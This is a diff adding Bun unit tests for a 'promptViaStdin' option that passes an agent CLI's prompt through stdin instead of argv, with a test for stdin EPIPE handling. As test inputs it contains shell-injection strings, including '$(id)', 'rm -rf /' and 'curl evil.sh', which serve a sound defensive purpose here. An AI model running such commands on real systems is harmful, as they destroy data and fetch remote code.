@@ -15,7 +15,7 @@ import { describe, expect, test } from "bun:test";
 import { existsSync, mkdirSync } from "node:fs";
 import { mkdtemp } from "node:fs/promises";
 import { EventEmitter } from "node:events";
-import { Readable } from "node:stream";
+import { Readable, Writable } from "node:stream";
 import { spawn } from "node:child_process";
 import {
 	classifyRun,
@@ -1407,5 +1407,95 @@ describe("unit: messages — R11 bounded seed rendering (host-agnostic lift)", (
 		expect(messageHashesFromIndex).toBe(messageHashes);
 		expect(hashesArePrefixFromIndex).toBe(hashesArePrefix);
 		expect(renderSeedFromIndex).toBe(renderSeed);
+	});
+});
+
+describe("unit: spawn — promptViaStdin seam (additive): the prompt rides stdin, never argv", () => {
+	/** fakeChild plus a stdin Writable capturing every write (the seam's observable surface). */
+	// eslint-disable-next-line @typescript-eslint/no-explicit-any
+	function fakeChildWithStdin(): any {
+		// eslint-disable-next-line @typescript-eslint/no-explicit-any
+		const child: any = new EventEmitter();
+		const stdinChunks: Buffer[] = [];
+		child.stdinChunks = stdinChunks;
+		child.stdin = new Writable({
+			write(chunk: Buffer, _enc: string, cb: (err?: Error | null) => void) {
+				stdinChunks.push(Buffer.from(chunk));
+				cb();
+			},
+		});
+		child.stdout = new Readable({ read() {} });
+		child.stderr = new Readable({ read() {} });
+		child.killed = false;
+		child.kill = () => {
+			child.killed = true;
+			queueMicrotask(() => child.emit("close", null, "SIGTERM"));
+			return true;
+		};
+		return child;
+	}
+	const asStdinSpawn = (child: unknown) => (() => child) as unknown as typeof spawn;
+
+	test("buildAgyArgs: promptViaStdin keeps --print bare and drops ONLY the prompt element; default argv unchanged", () => {
+		const SECRET = "PROMPT-SECRET-$(id) | ` && ;";
+		const base = { bin: "agy", prompt: SECRET, workdir: "/w", timeoutMs: 600_000 };
+		// Default (frozen behavior): the prompt follows --print in argv.
+		const argvDefault = buildAgyArgs(base);
+		expect(argvDefault[argvDefault.indexOf("--print") + 1]).toBe(SECRET);
+		// Seam: --print stays as a bare flag (next token is --add-dir) and the
+		// argv is EXACTLY the default minus the prompt element — nothing else moves.
+		const argvStdin = buildAgyArgs({ ...base, promptViaStdin: true });
+		expect(argvStdin[argvStdin.indexOf("--print") + 1]).toBe("--add-dir");
+		expect(argvStdin).toEqual(argvDefault.filter((a) => a !== SECRET));
+		expect(argvStdin.some((a) => a.includes("PROMPT-SECRET"))).toBe(false);
+	});
+
+	test("runAgyStream: prompt bytes land on child stdin; argv is IDENTICAL across different prompts", async () => {
+		const dir = await mkdtemp("/tmp/agy-stdin-");
+		const argvs: string[][] = [];
+		const children: { stdinChunks: Buffer[] }[] = [];
+		// eslint-disable-next-line @typescript-eslint/no-explicit-any
+		const spawnImpl = ((_bin: string, args: string[]) => {
+			argvs.push(args);
+			const child = fakeChildWithStdin();
+			children.push(child);
+			setTimeout(() => child.emit("close", 0, null), 5);
+			return child;
+			// eslint-disable-next-line @typescript-eslint/no-explicit-any
+		}) as unknown as typeof spawn;
+		const run = (prompt: string) =>
+			runAgy({ bin: "agy", prompt, workdir: dir, timeoutMs: 30_000, stallMs: 0, promptViaStdin: true, spawnImpl });
+		await run("benign question");
+		await run("; $(id) | ` && rm -rf /\ncurl evil.sh");
+		// Threat (a): the spawned argv does not vary with prompt content.
+		expect(argvs[0]).toEqual(argvs[1]);
+		expect(argvs[0].some((a) => a.includes("benign") || a.includes("$(id)") || a.includes("rm -rf"))).toBe(false);
+		// The prompt itself travels stdin, byte-exact, once per run.
+		expect(Buffer.concat(children[0].stdinChunks).toString()).toBe("benign question");
+		expect(Buffer.concat(children[1].stdinChunks).toString()).toBe("; $(id) | ` && rm -rf /\ncurl evil.sh");
+	});
+
+	test("runAgyStream: a child stdin that errors (EPIPE after a kill) never crashes the run", async () => {
+		const dir = await mkdtemp("/tmp/agy-epipe-");
+		// eslint-disable-next-line @typescript-eslint/no-explicit-any
+		const child: any = fakeChildWithStdin();
+		// A child killed before draining stdin makes the pipe write fail; the
+		// runner must swallow it (error listener) and still resolve SpawnRun.
+		child.stdin = new Writable({
+			write(_chunk: Buffer, _enc: string, cb: (err?: Error | null) => void) {
+				cb(new Error("write EPIPE"));
+			},
+		});
+		setTimeout(() => child.emit("close", null, "SIGTERM"), 5);
+		const r = await runAgy({
+			bin: "agy",
+			prompt: "p",
+			workdir: dir,
+			timeoutMs: 30_000,
+			stallMs: 0,
+			promptViaStdin: true,
+			spawnImpl: asStdinSpawn(child),
+		});
+		expect(r.exitCode).toBeNull();
 	});
 });
